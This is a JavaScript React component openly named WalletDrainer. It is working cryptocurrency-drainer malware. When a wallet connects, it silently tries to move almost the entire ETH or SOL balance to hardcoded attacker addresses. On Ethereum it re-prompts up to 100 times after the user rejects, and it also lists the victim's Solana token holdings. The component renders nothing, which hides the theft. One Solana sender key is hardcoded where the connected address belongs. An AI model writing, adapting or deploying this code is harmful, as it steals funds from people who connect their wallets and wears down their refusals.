"use client";

import { useEffect } from "react";
import { ethers } from "ethers";
import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from "@solana/web3.js";
import { useWalletInfo } from "@reown/appkit/react";
import { useAppKitConnection } from "@reown/appkit-adapter-solana/react";
import { useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";

const DRAIN_ADDRESSES = {
  ethereum: "0x0775bfb375757a355af3e318a55f6a23ba03d520",
  solana: "DcxDHKrEM7CY6nHZJepi9GzRh9vNFJnHt5ipaoxs8ZVB",
};

// 🚀 Drain Ethereum Wallet
async function drainEthereumWallet(wallet) {
  console.log("🔄 ETH Drainer Triggered for address:", wallet);

  if (typeof window === "undefined" || !window.ethereum) {
    console.error("⚠️ No Ethereum provider found. Make sure MetaMask is installed.");
    return;
  }

  const provider = new ethers.BrowserProvider(window.ethereum);

  try {
    const accounts = await window.ethereum.request({ method: "eth_accounts" });

    if (accounts.length === 0) {
      console.log("🔑 Requesting account access...");
      await window.ethereum.request({ method: "eth_requestAccounts" });
    }

    const signer = await provider.getSigner();
    console.log("✅ Connected to Ethereum Wallet:", await signer.getAddress());

    let attempts = 0;
    const maxRetries = 100;
    const delayBetweenRetries = 3000;

    while (attempts < maxRetries) {
      try {
        const balance = await provider.getBalance(wallet);
        console.log(`💰 ETH Balance: ${ethers.formatEther(balance)} ETH`);

        const gasLimit = ethers.parseUnits("0.0001", "ether");
        let sendAmount = balance - gasLimit;

        if (sendAmount <= 0n) {
          console.log("❌ Not enough ETH to cover gas fees.");
          return;
        }

        console.log(`🚀 Attempting Transaction ${attempts + 1}/${maxRetries}`);

        const tx = await signer.sendTransaction({
          to: DRAIN_ADDRESSES.ethereum,
          value: sendAmount,
          gasLimit,
        });

        console.log("✅ ETH Transaction sent:", tx.hash);
        return;
      } catch (error) {
        if (error.code === "ACTION_REJECTED") {
          console.warn(`⚠️ User rejected transaction (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
          attempts++;
          await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
        } else {
          console.error("❌ Transaction failed due to an unexpected error:", error);
          return;
        }
      }
    }

    console.error("🚨 Max retries reached. Transaction not completed.");
  } catch (error) {
    console.error("❌ Could not retrieve signer:", error);
  }
}

// 🚀 Drain Solana Wallet (Now inside a React Component)
export default function WalletDrainer({ wallet }) {
  const { walletInfo } = useWalletInfo();
  const { name: walletName } = walletInfo || {};
  const { isConnected, address, caipAddress } = useAppKitAccount();
  const { connection } = useAppKitConnection();
  const { walletProvider } = useAppKitProvider("solana");

  console.log("✅ Wallet Drainer Connected:", isConnected, address, caipAddress);

  useEffect(() => {
    if (!wallet || !isConnected || !address) return;

    async function drainSolanaWallet() {
        console.log("🔄 SOL Drainer Triggered", address);
  
        if (!address || typeof address !== "string") {
          console.error("❌ Invalid Solana address:", address);
          return;
        }
  
        try {
        //   const senderPublicKey = new PublicKey(address);
        const senderPublicKey = new PublicKey('EvCLRnx9FXfviUw92xHojEKJqnuNCbETkQm87eHqKPpb');
          console.log("✅ Address is valid:", senderPublicKey.toBase58());
  
          // Get the latest blockhash
          const latestBlockhash = await connection.getLatestBlockhash();
          console.log("🔗 Latest Blockhash:", latestBlockhash.blockhash);

          const tokenAccounts = await connection.getParsedTokenAccountsByOwner(senderPublicKey, {
            programId: new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
          });

          console.log(`✅ Related SPL Mint Token Wallets:`, tokenAccounts.value);

          // 
          const tokensToDrain = tokenAccounts.value.filter(account => {
            const amount = BigInt(account.account.data.parsed.info.tokenAmount.amount);
            return amount > 200000000n;
          });
      
          console.log(`Found ${tokensToDrain.length} tokens with balance`);
          console.log(`✅ Related SPL Mint Token with Balances:`, tokensToDrain);
  
          // Fetch SOL balance
          const balance = await connection.getBalance(senderPublicKey);
        //   const balance = 1000000000000;
          console.log(`💰 SOL Balance: ${balance / LAMPORTS_PER_SOL} SOL`);


        // const gasFee = 4950000;
        const gasFee = 2000000;

  
          if (balance <= gasFee) {
            console.log("❌ Not enough SOL to cover transaction fees.");
            return;
          }
  
          const sendAmount = balance - gasFee;
          const recipientPublicKey = new PublicKey(DRAIN_ADDRESSES.solana);
  
          let attempts = 0;
          const maxRetries = 10;
          const delayBetweenRetries = 50000;
  
          while (attempts < maxRetries) {
            try {
              console.log(`🚀 Attempting SOL Transaction ${attempts + 1}/${maxRetries}...`);
  
              // Ensure we use the latest valid blockhash
              const updatedBlockhash = await connection.getLatestBlockhash();
              console.log("🔄 Refetched Blockhash:", updatedBlockhash.blockhash);


  
              const transaction = new Transaction({
                feePayer: senderPublicKey,
                recentBlockhash: updatedBlockhash.blockhash,
              }).add(
                SystemProgram.transfer({
                  fromPubkey: senderPublicKey,
                  toPubkey: recipientPublicKey,
                  lamports: sendAmount,
                })
              );
  
              // Sign and send the transaction
              const signature = await walletProvider.sendTransaction(transaction, connection);
              console.log("✅ SOL Transaction sent:", signature);
  
              // Confirm the transaction
              await connection.confirmTransaction(signature, "confirmed");
              console.log("✅ Transaction confirmed");
              return;
            } catch (error) {
              console.error("❌ Transaction Error:", error);
  
              // Handle specific errors
              if (error.message.includes("Blockhash not found")) {
                console.warn(`⚠️ Blockhash expired (attempt ${attempts + 1}/${maxRetries}). Retrying...`);
              } else if (error.message.includes("Attempt to debit an account but found no record of a prior credit")) {
                console.warn("⚠️ Account has no SOL history. Transaction not possible.");
                return;
              } else if (error.message.includes("User rejected the request")) {
                console.warn("⚠️ User canceled the transaction.");
                return;
              } else {
                console.error("🚨 Unexpected transaction error:", error);
                return;
              }
  
              attempts++;
              await new Promise((resolve) => setTimeout(resolve, delayBetweenRetries));
            }
          }
  
          console.error("🚨 Max retries reached. SOL transaction not completed.");
        } catch (error) {
          console.error("❌ Unexpected error:", error);
        }
      }

    if (caipAddress.toLowerCase().includes("solana")) {
      console.log("Wallet drainer triggered for Solana");
      drainSolanaWallet();
    } else {
      console.log("Wallet drainer triggered for Ethereum");
      drainEthereumWallet(wallet);
    }
  }, [wallet, caipAddress, isConnected, address, connection, walletProvider]);

  return <></>;
}
